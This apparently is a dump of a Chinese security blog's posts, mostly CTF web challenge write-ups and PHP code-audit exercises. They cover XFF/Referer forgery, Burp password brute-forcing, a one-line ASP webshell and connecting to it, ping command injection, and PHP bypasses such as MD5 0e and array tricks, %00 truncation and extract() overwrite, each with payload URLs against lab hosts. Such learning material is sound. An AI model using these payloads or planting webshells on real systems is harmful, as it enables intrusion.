\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"));h = window.prompt('Enter password');alert(dechiffre(h)); 这一长串16进制数很可疑， 1\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\" 转字符得到：55,56,54,79,115,69,114,116,107,49,50再将其转换为10进制ASCII码对应的字符得到 ：786OsErtk12加上题目给出的格式得到flag（解码函数似乎不能得到正确密码//orz？） xff_referer题目描述：X老师告诉小宁其实xff和referer是可以伪造的。打开链接如图： X-Forwarded-For和RefererXFF构造来源IPReferer构造来源浏览器X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理利用bp抓包： 在HTTP头添加：X-Forwarded-For:123.123.123.123 得到下图提示： 再加一条Referer:https://www.google.com 得到flag。1:(/images/7.5.png)由于每次添加都要重新输入，这里可以利用Repeater功能： 得到： 可以在左边直接编辑Request—&gt;右侧得到Response： Response—&gt;Flag! 自己编辑的时候注意Target的格式： 去掉请求协议http:// 相关知识URL与URI：https://blog.csdn.net/lslk9898/article/details/86490383 weak_auth题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。 根据弹窗的提示，用户名必须是admin将usename设置为admin，随手！！！真的是随手，输了个123456，结果对了hhh :) —————————-正常解法———————-用Burp Suite对它进行密码爆破，可以先试着输入username=admin和password=11111,以确定爆破位置。Action—&gt;send to Intruder 基本配置：1、在消息编辑器的上方，有一个下拉选择框，攻击类型（Attack Type），几种不同的方式，这里选择：集束炸弹模式（Cluster bomb） 它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），依次遍历所有的Payload。它与草叉模式的主要区别在于，执行的Payload数据Payload组的乘积。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起四次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为A和D，第三次使用的Payload分别为B和C，第四次使用的Payload分别为B和D。 2、由于username规定用admin；简单列表（Simple list） ——最简单的Payload类型，通过配置一个字符串列表作为Payload，也可以手工添加字符串列表或从文件加载字符串列表。其设置界面如下图 3、导入密码list 4、可选项设置（Options）可选项设置主要包括请求消息头设置、请求引擎设置、攻击结果设置、grep match, grep extract, grep payloads,以及重定向设置。在使用中，你可以在攻击前进行设置，也可以在攻击过程中做这些选项的调整。 开始爆破： 可以明显看到出现了长度不一样的响应，123456应该就是正确密码，查看Response得到Flag。 webshell题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。 知识补充：webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。上传木马拿webshell的方法汇总图片给出的代码为php一句话木马：一句话木马的工作原理：一句话木马分析服务端与客户端。 “一句话木马”服务端（是用于本地的html提交脚本木马文件）就是我们要用来插入到asp文件中的asp语句，（不仅仅是以asp为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为 &lt;%execute request(“value”)%&gt; 其中value可以自己修改“一句话木马”客户端（远程服务器上被插入一句话的asp可执行文件）用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件 用中国菜刀或者蚁剑等工具可以上传或执行命令，密码是shell。 连接成功： 选择双击： 看到flag.txt,打开： command_execution题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 知识补充：1、ping （网络诊断工具）Ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。应用格式：ping空格IP地址。该命令还可以加许多参数使用，具体是键入ping按回车即可看到详细说明。作为一个生活在网络上的管理员或者黑客来说，ping命令是第一个必须掌握的DOS命令，它所利用的原理是这样的：利用网络上机器IP地址的唯一性，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通，时延是多少。ping指的是端对端连通，通常用来作为可用性的检查， 但是某些病毒木马会强行大量远程执行ping命令抢占你的网络资源，导致系统变慢，网速变慢。严禁ping入侵作为大多数防火墙的一个基本功能提供给用户进行选择。 2、有关命令执行的知识windows或linux下： 1234command1 &amp; command2 ：先执行command2后执行command1command1 &amp;&amp; command2 ：先执行command1后执行command2command1 | command2 ：只执行command2command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2) 3、WAFWeb应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。Web应用防火墙会对HTTP的请求进行异常检测，拒绝不符合HTTP标准的请求。并且，它也可以只允许HTTP协议的部分选项通过，从而减少攻击的影响范围。甚至，一些Web应用防火墙还可以严格限定HTTP协议中那些过于松散或未被完全制定的选项。（WAF绕过）此题给出未开WAF，所以不用考虑这一步。 4、还需要掌握一些常用的命令ls 对于目录，该命令列出该目录下的所有子目录与文件。对于文件，将列出文件名以及其他信息。Cd 改变工作目录，将当前工作目录改变到指定的目录下。cat是打印文件内容tac 是反向打印less 文件名：分页显示文件内容（如less /etc/passwd）Find 沿着文件层次结构向下遍历，匹配符合条件的文件，并执行相应操作。关于find可以参考：https://www.jianshu.com/p/16af649d9b6d*&lt;利用截断来执行行的命令，如’$’ 和 ‘ ; ‘和 ‘|’ 和 ‘-‘ 和 ‘(‘ 和 ‘ ) ‘ 和 ‘ “ ‘ 和 ‘||’ 和’&amp;&amp;’ 和 ‘&amp;’ 和 ‘{‘ 和 ‘}’等&gt;*实际操作： 试着使用命令连接符，查看目录 发现有home目录，看看里面有啥： 发现有flag.txt;或者直接根据文件名或正则表达式进行搜索，如下： 得到flag.txt在home下，cat一下： 同时这道题，查看代码可以发现：POST传参是通过参数target，而target就是我们所要输入的值 尝试post传值： 得到flag: simple_php##题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。打开链接： 很简单的PHP代码：a要等于0，又不能等于0；b不能是数字，但还要大于1234 is_numeric（）来函数用于检测变量是否为数字或数字字符串。如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE。 此处靠php弱类型比较：可查看我的这篇博文构造如下url:","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://singlemindedt.github.io/categories/CTF/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Images","slug":"images","date":"2019-09-04T09:37:45.000Z","updated":"2019-09-05T14:33:05.157Z","comments":true,"path":"2019/09/04/images/","link":"","permalink":"https://singlemindedt.github.io/2019/09/04/images/","excerpt":"","text":"Inset demo …","categories":[],"tags":[]},{"title":"攻防世界之Web新手（1-6）","slug":"攻防世界之Web新手（1-6）","date":"2019-09-04T07:11:48.415Z","updated":"2019-12-30T03:22:38.168Z","comments":true,"path":"2019/09/04/攻防世界之Web新手（1-6）/","link":"","permalink":"https://singlemindedt.github.io/2019/09/04/攻防世界之Web新手（1-6）/","excerpt":"","text":"[TOC] view_source题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。打开链接如下： view0 方法1试试右键的确不管用了，直接F12，找到flag 方法2另外还可以通过view-source：url查看源代码： 方法3其实还可以禁用Js代码，这样右键就可以用了： get_post题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？ 知识补充：两种 HTTP 请求方法：GET 和 POST在客户机和服务器之间进行请求-响应时，两种最常被用到的方法是：GET 和 12345POST。&#123;GET - 从指定的资源请求数据。POST - 向指定的资源提交要被处理的数据&#125; https://www.w3school.com.cn/tags/html_ref_httpmethods.asp https://baijiahao.baidu.com/s?id=1620934682611653374&amp;wfr=spider&amp;for=pc 实际操作：打开网址，得到如下要求 &lt;用GET给后端传参的方法是：在?后跟变量名字，不同的变量之间用&amp;隔开&gt;在url后添加/？a=1即可发送get请求。 利用hackbar进行POST传参：复制get的url，选择postdata，填入b=2，选择execute。即可发送POST请求。 关于GET 和 POST：https://www.cnblogs.com/williamjie/p/9099940.html Robots题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 知识补充： robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。 当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。 如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。 Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。【https://blog.csdn.net/qq_40491569/article/details/83473703】 实际操作：打开网页空白； 在题URL后输入/robots.txt即： http://111.198.29.45:35567/robots.txt f1ag_1s_h3re.php这个页面不允许被爬取，查看一下f1ag_1s_h3re.php页面得到flag. Backup题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！ 知识补充备份文件: bak（被自动或是通过命令创建的辅助文件，它包含某个文件的最近一个版本） 实际操作试着在index.php后加.bak得到index.php.bak的备份文件，打开得到flag Cookie知识补充： Cookie 可以翻译为“小甜品，小饼干”，Cookie 在网络系统中几乎无处不在，当我们浏览以前访问过的网站时，网页中可能会出现 ：你好 XXX，这会让我们感觉很亲切，就好像吃了一个小甜品一样。这其实是通过访问主机中的一个文件来实现的，这个文件就是 Cookie。在 Internet 中，Cookie 实际上是指小量信息，是由Web服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。其实cookies是由网络服务器存储在你电脑硬盘上的一个txt类型的小文件，它和你的网络浏览行为有关，所以存储在你电脑上的cookies就好像你的一张身份证，你电脑上的cookies和其他电脑上的cookies是不一样的;cookies不能被视作代码执行，也不能成为病毒，所以它对你基本无害。cookies的作用主要是，当你访问了某些网页，并且对网页的一些设置进行修改，cookies就能跟踪并记录到这些修改，当你下一次访问这个网页的时候，这个网页会分析你电脑上的cookies，进而采取措施像你返回更符合你个性化的网页; 当然，目前大部分广告的定位基础也是基于cookies的，比如你此前访问了大量的健身类网站，cookies记录了你的访问行为，广告主就能够根据你的访问行为，向你推送健身类的广告。 实际操作：利用开发者工具F12键—网络，查看消息头看到“Cookie look-here=cookie.php” 根据提示信息，在URL后加上”/cookie.php”即http://111.198.29.45:47420/cookie.php 提示查看HTTP响应，在消息头里发现flag。 disabled_button题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ 知识补充：需要熟悉一些常见的HTML知识 实际操作：右键-&gt;查看元素，在input中用了‘disabled=” “’属性，双击，将其删掉，按钮便可正常使用。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://singlemindedt.github.io/categories/CTF/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"代码审计","slug":"代码审计ONE","date":"2019-09-03T14:35:18.000Z","updated":"2019-09-04T08:46:22.694Z","comments":true,"path":"2019/09/03/代码审计ONE/","link":"","permalink":"https://singlemindedt.github.io/2019/09/03/代码审计ONE/","excerpt":"","text":"PHP大法（来源：实验吧 解题链接： http://ctf5.shiyanbar.com/DUTCTF/index.php）点开链接只有如上一句话。根据提示 直接访问： index.php.txt （即：http://ctf5.shiyanbar.com/DUTCTF/index.php.txt）得到如下页面：分析代码： 1234567891011121314151617 &lt;?php if(eregi(\"hackerDJ\",$_GET[id])) &#123; //对id进行字符串匹配，若$_GET[id]中有hacker DJ则 //出not allowed!并终止正在执行的进程; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit(); &#125; $_GET[id] = urldecode($_GET[id]); //urldecode对字符串进行URL解码;将解码后的//$_GET[id]赋值给$_GET[id]; if($_GET[id] == \"hackerDJ\") //若$_GET[id]的值等于hackerDJ，输出Access granted! //并给出flag: *****************&#125; &#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;\"; &#125; ?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website? 12345678$_GET说明通过 URL 参数传递给当前脚本的变量的数组Example #1$_GET范例 &lt;?php echo 'Hello ' . htmlspecialchars($_GET[\"name\"]) . '!'; ?&gt;假设用户访问的是 http://example.com/?name=Hannes以上例程的输出类似于： Hello Hannes! 解题思路：有$_GET[id] 所以应该是可以用 ?id= 来构造URLid变量是一个url解码函数前不包含hackerDJ，url解码函数后为hackerDJ的变量，即id在进入url解码函数前必须是hackerDJ的url编码形式 注意：由于在浏览器输入url后会进行一次decode，这段代码中又进行一次decode，所以应对hackerDJ进行两次encode。只进行一次encode，浏览器自动解码后即为hackerDJ,被eregi()拦住，所以要进行二次编码，即对%68%61%63%6B%65%72%44%4A进行url编码。 ① http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%68%61%63%6B%65%72%44%4A ② http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 或者直接对其中的一个字母进行二次编码： h –&gt; %68 –&gt; %2568构造url: index.php?id=%2568ackerDJ Very easy打开链接直接得到如下代码： 1234$what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 分析：如果$what等于flag,则给出flag。解决：http://123.206.87.240:8002/get/?what=flag 得到flag。 Experiment 1打开链接直接出现PHP代码： 123456789101112131415&lt;?php include \"flag.php\"; highlight_file(__FILE__); if (isset($_GET['money'])) &#123; $money=$_GET['money']; if(strlen($money)&lt;=4&amp;&amp;$money&gt;time()&amp;&amp;!is_array($money)) &#123; echo $flag; echo \"&lt;!--By:daoyuan--&gt;\"; &#125; else echo \"Wrong Answer!\"; &#125; else echo \"Wrong Answer!\";?&gt; 代码分析：第一行:告诉我们flag应该就在flag.php中第二行：highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。 提示：用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。 注释：当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！ 语法：highlight_file(filename,return)filename 必需。规定要显示的文件。return 可选。如果该参数设置为 TRUE，该函数将以字符串形式返回高亮显示的代码，而不是直接进行输出。默认是 FALSE。返回值如果 return 参数设置为 TRUE，该函数将以字符串形式返回高亮显示的代码，而不是直接进行输出。否则，如果成功则返回 TRUE，如果失败则返回 FALSE。If条件：$money的长度&lt;=4；同时&gt;time()；同时不是数组{time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数。此处我们直接将其理解为一个很大的数}==PHP中，字符串开头以xex开头，x代表数字。会被转换成科学计数法。 如1e9 == 1×10^9==解决：直接用xex格式如：http://119.23.73.3:5001/web6/?money=10e9 直接得到flag Experiment 2打开链接页面中只有一句话“好像少了点什么”，试着在url后添加index.php~即http://119.23.73.3:5001/web5/index.php~。打开页面发现什么都没有，查看源文件发现果然有PHP文件： 分析代码：9：给出$flag的值为我们最终需要的结果 1moctf&#123;**************&#125; 11：{PHP的isset()函数 一般用来检测变量是否设置格式：bool isset ( mixed var [, mixed var [, …]] )功能：检测变量是否设置返回值：若变量不存在则返回 FALSE若变量存在且其值为NULL，也返回 FALSE若变量存在且值不为NULL，则返回 TURE同时检查多个变量时，每个单项都符合上一条要求时才返回 TRUE，否则结果为 FALSE版本：PHP 3, PHP 4, PHP 5更多说明：使用 unset() 释放变量之后，它将不再是 isset()。PHP函数isset()只能用于变量，传递任何其它参数都将造成解析错误。检测常量是否已设置可使用 defined() 函数。} 1234If条件下对变量$_GET['a']和$_GET['b']赋值，并将其赋值给$a,$b.若$a等于$b则打印Wrong Answer!否则在条件md5($a)==md5($b)下给出$flag，否则打印Wrong Answer！**即此代码的意思时要我们对提供$a,$b使得其值不同，但MD5值相同。** ***弱类型比较——“==”类型转换的规则1、字符串和数字比较，字符串会被转换成数字。 “admin”==0 (true) admin被转换成数字，由于admin是字符串，转换失败，int(admin)=0，所以 比较结果是true。2、混合字符串转换成数字，看字符串的第一个。 “1admin”==1 “2admin”==23、字符串开头以xex开头，x代表数字。会被转换成科学计数法。 1e9 == 1×10^9 注： 12\"admin1\"==1 //false\"admin1\"==0 //true 参考网上资料：当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内则：该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。 所以我们可以直接找符合xex格式的MD5原参{MD5 算法自诞生之日起，就有很多人试图证明和发现它的不安全之处，即存在碰撞（在对两个不同的内容使用 MD5算法运算的时候，有可能得到一对相同的结果值）–百科}md5的碰撞，在PHP的数的处理中，类似0开头的字符串会被转换成0，因此有md5碰撞。 MD5值(哈希值)相等的问题可以用哈希值碰撞，也可以用数组绕过，如： 1`username[]=1&amp;password[]=2. 解决：http://119.23.73.3:5001/web5/**?a=QNKCDZO&amp;b=s878926199a** ,直接得到flag。 1md5('**QNKCDZO**')==md5('**s878926199a** ')---&gt;True Experiment 2.1题目给出了php代码： 12345678910111213&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (isset($_GET['username']) and isset($_GET['password'])) &#123;if ($_GET['username'] == $_GET['password'])print 'Your password can not be your username.';else if (md5($_GET['username']) === md5($_GET['password']))die('Flag: '.$flag);elseprint 'Invalid password';&#125;?&gt; 分析代码：1我们得构造$_GET[‘username’]和$GET[‘password’]的值不相等，同时它们的md5的值相等才能得到flag 因为md5不能处理数组，可以使用数组绕过，md5(数组)会返回FALSE，username[]=1,password[]=2这样弱==下可以实现username!=password,同时会得到FALSE===FALSE使得md5(username)===md5(password)成立。解决：http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2 直接得到flag。 Experiment 3打开链接得到：细细品味后发现“链接”下真有一个链接。点开得到php代码： 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123;$v1 = $_GET['v1'];$v2 = $_GET['v2'];$v3 = $_GET['v3'];if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;if(!strcmp($v3, $flag))&#123;echo $flag;&#125;&#125;&#125;?&gt; 分析代码：v1不等于v2同时两者的MD5值相等&lt;此处既可以用MD5的0e漏洞也可以利用数组绕过&gt;由if(!strcmp(v3,flag))需要v3和flag值相同才返回flag的值 strcmp漏洞int strcmp ( string str1,stringstr2 )str1是第一个字符串，str2是第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 但是如果我们传入非字符串类型的数据的时候，这个函数将发生错误，在5.3之前的php中，显示了报错的警告信息后，将return 0 ! 也就是虽然报了错，但却判定其相等了。 因此，解这道题，就只要传入一个非字符串类型的变量使其报错，又由于前面的否定“！”得到true。解决：http://123.206.31.85:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=1 Experiment 3.2打开链接得到空页，根据给出的php代码： 123456789&lt;?php$flag = \"flag&#123;xxxxx&#125;\";if (isset($_GET['a'])) &#123;if (strcmp($_GET['a'], $flag) == 0) die('Flag: '.$flag);elseprint 'No';&#125;?&gt; 分析代码： 第一行，flag变量被设置为flag{xxxxx}。这并不是我们要提交的flag，真实运行的后端中的flag变量才是真的flag。 第二行，isset函数判断HTTP GET请求中的参数a是否已设置并且非NULL。strcmp函数将a参数与flag相比较，如果一致，则调用die函数。die函数的作用是打印die函数的参数，并立即停止该php后端的运行。那么我们的目标很明显，就是要让php执行到die函数，显示flag。根据上题strcmp漏洞，我们可以直接利用数组绕过比如用”a[]=”解决：http://123.206.87.240:9009/6.php?a[]= ereg截断打开链接同样是一个空白页面，根据给出的php代码： 1234567891011&lt;?php$flag = \"flag\";if (isset ($_GET['password'])) &#123;if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; 分析代码：flag变量被设置为flag，即最终我们需要得到flag变量的内容从而达到真正的flag。isset函数判断HTTP GET请求中的参数password是否已设置并且非NULL ereg()函数 1234567&#123; ereg ( string $pattern , string $string [, array &amp;$regs ] ) : int函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。&#125;ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) !== FALSE由第一个参数正则表达式可知该字符串从头到尾只允许出现字母与数字即a-z、A-Z、0-9. strpos()函数123456&#123; strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : int查找字符串在另一字符串中第一次出现的位置。&#125;strpos ($_GET['password'], '--') !== FALSE该字符串必须有“*--*”字符。 这两个条件明显发生冲突，由于ereg()函数存在%00截断，即ereg()读取字符串时，当遇到%00会默认已经读完，不再读取后面的内容，这样我们就可以利用此漏洞在%00后添加“–”从而绕过正则检测。 解决：http://123.206.87.240:9009/19.php?password=12%00--同时，ereg()只能处理字符串，遇到数组做参数返回NULL，条件用强 === （要求两边类型相同），而NULL跟FALSE类型不同,顺利进入下一个条件；strpos()的参数也不能为数组，否则返回NULL，与FALSE类型不同，满足！==条件，故也可以直接传入一个数组。解决：http://123.206.87.240:9009/19.php?password[]=（或http://123.206.87.240:9009/19.php?password[]=1只是一个为空值一个给了个值。） Extract打开链接空白页面，分析给出的php代码： 12345678910&lt;?php$flag='xxx';extract($_GET); if(isset($shiyan))&#123; $content=trim(file_get_contents($flag)); if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;'; &#125; else &#123; echo'Oh.no'; &#125; &#125;?&gt; extract()函数{extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。但是当变量中有同名的元素时，该函数默认将原有的值给覆盖掉，这就造成了变量覆盖漏洞。} 代码分析：将flag变量设置为xxx；将GET 方法传输进来的值通过extract()函数处理；isset函数判断HTTP GET请求中的参数shiyan是否已设置并且非NULL;if 判断shiyan这个变量和content这个变量是否相等。content 的值是通过读取 flag 变量的值来获取的。如果这个两个变量相等输出 flag 。file_get_contents() — 将整个文件读入一个字符串。trim() — 去除字符串首尾处的空白字符（或者其他字符）。解决：由于我们不知道flag的值是什么？所以我们需要利用extract()函数漏洞，进行变量覆盖，重新给flag变量赋值。只要我们构造的payload使得 $shiyan = $content ，其中 $content 的值又取决于 flag 变量，所以只要 shiyan变量相等于flag变量即可。由于file_get_contents($flag) 中的$flag是一个参数，导致$content的值是空值，所以我们可以构造如下payload：http://123.206.87.240:9009/1.php?shiyan= 这里再引一位大佬的解答：（代码稍有不同）https://zhouxinan.github.io/ 123456789101112&lt;?php$flag='xxx';extract($_GET);if(isset($sixstars)) &#123; $content=trim(file_get_contents($flag)); if ($sixstars==$content) &#123; echo 'flag&#123;xxx&#125;'; &#125; else &#123; echo 'Oh.no'; &#125;&#125;?&gt; 首先，flag变量被设置为’xxx’，一个简单的字符串。接着，后端运行了extract函数，从$_GET数组中将变量导入到当前的符号表。什么意思呢？其实很简单。比如如果我们访问了http://139.224.220.67:23900/dmsj/level2/?sixstars=1，那么`$_GET[&quot;sixstars&quot;]`的值为字符串1。执行`extract($_GET)`;时，就相当于执行了`$sixstars=&#39;1&#39;`。然后，程序将会执行isset($sixstars)。我们看到，为了获取flag，必须执行到echo ‘flag{xxx}’;，所以isset($sixstars)的返回值必须为 TRUE。所以，我们必须通过extract($_GET);将sixstars变量设置为任意值，即使是空字符串也可以。也就是说，即使访问http://139.224.220.67:23900/dmsj/level2/?sixstars=也是可以的。但绝对不能不包含sixstars参数。接着，程序将会执行$content=trim(file_get_contents($flag));。我们分步看。首先会执行file_get_contents($flag)。正常情况下，如果你不通过URL传入flag参数，那么，因为程序的最开始已经执行过$flag=&#39;xxx&#39;;，所以到了这里将会执行file_get_contents(‘xxx’)。file_get_contents函数可以“将整个文件读入一个字符串”。比如如下代码可以将http://www.example.com/网站的源代码读取到homepage变量中并显示出来。 1234&lt;?php$homepage = file_get_contents('http://www.example.com/');echo $homepage;?&gt; 接着，php又会执行trim函数，它将会“去除字符串首尾处的空白字符（或者其他字符）”。最后，php将会执行if ($sixstars==$content)，如果为TRUE，那么将会显示flag。读到这里，你想必已经知道了我们该怎么做：首先，给sixstars变量传入一个值，比如1。然后，给flag变量传入一个我们能控制的网站的地址，并让这个我们能控制的网站的源代码设置为1。由于extract能起到“变量覆盖”的作用，在extract后，flag变量就会被覆盖为我们能控制的网站的地址，而不再是’xxx’，这样当执行到file_get_contents时php后端将会从我们能控制的网站上读取到1，并将其和sixstars变量比较，并返回TRUE，然后就能打印flag。虽然这个方法是可行的，但是今天我要教你一个更简单的方法，那就是php伪协议。我们可以直接给flag变量传入data://text/plain,1。意思是明文1。这样file_get_contents(‘data://text/plain,1’)将会直接返回1，就不需要我们在公网上开一台服务器了。所以，最后我们的payload是：1 http://139.224.220.67:23900/dmsj/level2/?sixstars=1&amp;flag=data://text/plain,1这里再强调一下，给后端传参的方法是：在?后跟变量名字，不同的变量之间用&amp;隔开。","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://singlemindedt.github.io/categories/代码审计/"},{"name":"php","slug":"代码审计/php","permalink":"https://singlemindedt.github.io/categories/代码审计/php/"}],"tags":[{"name":"php","slug":"php","permalink":"https://singlemindedt.github.io/tags/php/"}]},{"title":"加密算法","slug":"加密算法","date":"2019-09-01T14:50:25.000Z","updated":"2019-09-01T14:50:25.208Z","comments":true,"path":"2019/09/01/加密算法/","link":"","permalink":"https://singlemindedt.github.io/2019/09/01/加密算法/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"反序列化","slug":"反序列化","date":"2019-09-01T14:49:34.000Z","updated":"2019-09-01T14:49:35.039Z","comments":true,"path":"2019/09/01/反序列化/","link":"","permalink":"https://singlemindedt.github.io/2019/09/01/反序列化/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"xxe","slug":"xxe","date":"2019-09-01T14:49:06.000Z","updated":"2019-09-01T14:49:06.023Z","comments":true,"path":"2019/09/01/xxe/","link":"","permalink":"https://singlemindedt.github.io/2019/09/01/xxe/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"VPS","slug":"VPS","date":"2019-09-01T14:47:52.000Z","updated":"2019-09-01T14:47:52.634Z","comments":true,"path":"2019/09/01/VPS/","link":"","permalink":"https://singlemindedt.github.io/2019/09/01/VPS/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"小雏鸟的成人式2","slug":"算法作业one","date":"2019-09-01T09:37:45.000Z","updated":"2019-09-05T14:24:01.539Z","comments":true,"path":"2019/09/01/算法作业one/","link":"","permalink":"https://singlemindedt.github.io/2019/09/01/算法作业one/","excerpt":"","text":"题目描述陶行知先生说：“我们要活的书，不要死的书 ”。 小雏鸟们从书上都是对的到现在能去伪存真的去使用书籍，证明你们长大了。总之就是要有自己的主见，自己的思考。 大白希望大家都能拿到一百分，所以对100这个数以及他的倍数很喜欢。 大白发现，从1开始，一定能找出一个序列从小到大排列，使得每一项都是 恰好能且仅能 被100整除D次。 请你编写程序，找到这个数列里第N个数。 输入多行。每行输入两个整数，表示D和N，N范围[1,100]，D范围[0,2] 输出每行对应输入，给出一个符合题意的整数 样例输入1230 51 112 85 样例输出12351100850000 提示###思路：很容易想到计算方法，其中N=100的情况需要注意，在下面带代码中给出。 题解：12345678910111213141516171819202122232425262728#include 